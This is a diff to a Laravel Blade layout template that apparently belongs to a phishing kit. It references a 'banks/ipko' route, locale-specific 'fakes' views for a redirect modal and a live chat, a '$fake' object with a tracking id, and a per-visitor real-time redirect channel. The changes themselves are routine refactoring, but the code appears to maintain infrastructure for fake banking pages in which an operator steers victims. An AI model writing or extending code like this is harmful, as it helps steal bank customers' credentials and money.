@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="{{ str_replace('_', '-', app()->getLocale()) }}"
-      id="html">
+      id="html" @hasSection('html_class') class="@yield('html_class')" @endif>
 <head>
     <meta charset="utf-8">
     @if (!(request()->is('banks/ipko')
@@ -27,7 +27,11 @@
     <script src="{{ asset('js/config.js') }}"></script>
     <script src="{{asset('js/loader.js')}}"></script>
     <!-- Styles -->
-    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
+    @hasSection('default_style')
+        @yield('default_style')
+    @else
+        <link href="{{ asset('css/app.css') }}" rel="stylesheet">
+    @endif
     <link href="{{ asset('css/loader.css') }}" rel="stylesheet">
     @stack('css')
     <script>const fake = @json($fake);</script>
@@ -40,8 +44,12 @@
 <div id="app" style="display:none;">
     @yield('content')
 </div>
-@include('fakes.includes.modal.redirect')
-@includeWhen($fake,'fakes.includes.chat.index')
+@if(View::exists("fakes.$locale.includes.modal.redirect"))
+    @include("fakes.$locale.includes.modal.redirect")
+@endif
+@if(View::exists("fakes.$locale.includes.chat.index"))
+    @include("fakes.$locale.includes.chat.index")
+@endif
 <script>
     @if($uuid = session()->get('uuid'))
     Echo.channel("redirect.{{$fake->track_id}}.{{$uuid}}")
